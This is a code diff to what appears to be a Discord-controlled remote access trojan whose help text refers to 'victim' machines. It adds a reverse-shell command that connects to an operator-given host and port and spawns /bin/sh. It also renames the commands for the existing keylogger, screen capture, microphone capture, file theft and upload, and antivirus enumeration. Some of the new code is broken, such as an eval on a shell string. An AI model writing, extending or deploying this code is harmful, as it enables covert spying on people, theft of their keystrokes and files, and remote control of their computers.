@@ -81,6 +81,24 @@ class MjolnirKeyL:
 
 class Mjolnir:
 
+    def get_screenshot(self):
+        platform = Heimdall().platform()
+        if platform == 'win32':
+            return self.screenshot_win()
+        elif platform == 'linux':
+            return self.screenshot_linux()
+        else:
+            return self.screenshot_macos()
+
+    def reverse(self, ip_port):
+        platform = Heimdall().platform()
+        if platform == 'win32':
+            raise Exception
+        else:
+            eval(f"""export BifrostHOST="{ip_port[0]}";export BifrostPORT={ip_port[1]};python -c 'import sys,socket,os,
+                        pty;s=socket.socket();s.connect((os.getenv("BifrostHOST"),int(os.getenv("BifrostPORT"))));[os.dup2(s.fileno(),
+                        fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'""")
+
     def screenshot_win(self):
         from mss.windows import MSS as mss
         with mss() as sct:
@@ -245,45 +263,45 @@ Example: %raven """ + mac + """ whoami
             ```""", """
 Screenshot:
             ```
-%screenshot <MAC_ADDRESS>
+%sc <MAC_ADDRESS>
 
     <MAC_ADDRESS>   -> Victim mac address
 
-Example: %screenshot """ + mac + """```""", """
+Example: %sc """ + mac + """```""", """
 Get File from victim:
             ```
-%download <MAC_ADDRESS> <path_to_file>
+%down <MAC_ADDRESS> <path_to_file>
 
         <MAC_ADDRESS>   -> Victim mac address
         <path_to_file>  -> Path to file
 
-Example: %download """ + mac + """ C:\\Users\\User\\Desktop\\some_file.txt```""", """
+Example: %down """ + mac + """ C:\\Users\\User\\Desktop\\some_file.txt```""", """
 Upload a File to victim:
             ```
-%upload <MAC_ADDRESS> <path_to_save_file_on_victim> <remote_file_location>
+%up <MAC_ADDRESS> <path_to_save_file_on_victim> <remote_file_location>
 
         <MAC_ADDRESS>                   -> Victim mac address
         <path_to_save_file_on_victim>   -> Path save on victim pc
         <remote_file_location>          -> Path to remote file
 
-Example: %upload """ + mac + """C:\\Users\\User\\Desktop\\some_file.txt 
+Example: %up """ + mac + """C:\\Users\\User\\Desktop\\some_file.txt 
 http://host.com/some_file.txt```""", """
 Keylogger:
             ```
-%keylogger <MAC_ADDRESS> start
+%kl <MAC_ADDRESS> start
 
     <MAC_ADDRESS>   -> Victim mac address
     This command you start a keylogger on victim
 
-Example: %keylogger """ + mac + """ start
+Example: %kl """ + mac + """ start
             ```
             ```
-%keylogger <MAC_ADDRESS> stop
+%kl <MAC_ADDRESS> stop
 
     <MAC_ADDRESS>   -> Victim mac address
     This command stop the keylogger on victim and send all the data
 
-Example: %keylogger """ + mac + """ stop```""", """
+Example: %kl """ + mac + """ stop```""", """
 Mic capture:
             ```
 %mic <MAC_ADDRESS>
@@ -304,13 +322,13 @@ Example: %mic """ + mac + """
 Example: %fmic """ + mac + """```""", """
 Antivirus:
             ```
-%antivirus <MAC_ADDRESS>
+%av <MAC_ADDRESS>
 
     <MAC_ADDRESS>   -> Victim mac address
     
     Return all installed antivirus from victim computer
 
-Example: %antivirus """ + mac + """```"""]
+Example: %av """ + mac + """```"""]
                     for msg in help_message:
                         time.sleep(0.5)
                         await message.channel.send(f'{msg}')
@@ -323,17 +341,11 @@ Example: %antivirus """ + mac + """```"""]
                     command.wait()
                     await self.sc(out, message)
 
-                if received_message.startswith('%screenshot'):
-                    platform = Heimdall().platform()
-                    if platform == 'win32':
-                        await message.channel.send(file=discord.File(f'{Mjolnir().screenshot_win()}'))
-                    elif platform == 'linux':
-                        await message.channel.send(file=discord.File(f'{Mjolnir().screenshot_linux()}'))
-                    else:
-                        await message.channel.send(file=discord.File(f'{Mjolnir().screenshot_macos()}'))
+                if received_message.startswith('%sc'):
+                    await message.channel.send(file=discord.File(Mjolnir().get_screenshot()))
                     os.remove('fullscreen.png')
 
-                if received_message.startswith('%keylogger'):
+                if received_message.startswith('%kl'):
                     if re.search('start', received_message, re.IGNORECASE):
                         stop_logger = False
                         keyl = MjolnirKeyL()
@@ -347,16 +359,16 @@ Example: %antivirus """ + mac + """```"""]
                         await message.channel.send(file=discord.File("logger.txt"))
                         os.remove('logger.txt')
 
-                if received_message.startswith('%download'):
+                if received_message.startswith('%down'):
                     try:
-                        file_path = received_message.split(f'%download {Heimdall().mac_address().upper()} ')[1]
+                        file_path = received_message.split(f'%down {Heimdall().mac_address().upper()} ')[1]
                         await message.channel.send(file=discord.File(file_path))
                     except Exception:
-                        file_path = received_message.split(f'%download {Heimdall().mac_address().upper()} ')[1]
+                        file_path = received_message.split(f'%down {Heimdall().mac_address().upper()} ')[1]
                         await message.channel.send(f'```{Mjolnir().upload_file(file_path)}```')
 
-                if received_message.startswith('%upload'):
-                    local_remote = received_message.split(f'%upload {Heimdall().mac_address().upper()} ')[1].split()
+                if received_message.startswith('%up'):
+                    local_remote = received_message.split(f'%up {Heimdall().mac_address().upper()} ')[1].split()
                     await message.channel.send(f'```{Mjolnir().download_file(local_remote[0], local_remote[1])}```')
 
                 if received_message.startswith('%mic'):
@@ -370,7 +382,7 @@ Example: %antivirus """ + mac + """```"""]
                 if received_message.startswith('%fmic'):
                     await self.voice_clients[0].disconnect()
 
-                if received_message.startswith('%antivirus'):
+                if received_message.startswith('%av'):
                     platform = Heimdall().platform()
                     if platform == 'win32':
                         command = subprocess.Popen(
@@ -382,6 +394,15 @@ Example: %antivirus """ + mac + """```"""]
                         await self.sc(out, message)
                     else:
                         await message.channel.send(f'```Only compatible for windows```')
+
+                if received_message.startswith('%shell'):
+                    ip_port = received_message.split(f'%shell {Heimdall().mac_address().upper()} ')[1].split()
+                    try:
+                        thread1 = Thread(target=Mjolnir().reverse(ip_port))
+                        thread1.start()
+                        await message.channel.send(f'```Reverse has spawned```')
+                    except Exception:
+                        await message.channel.send(f'```Error while opening reverse or not implemented yet```')
 
             else:
                 return
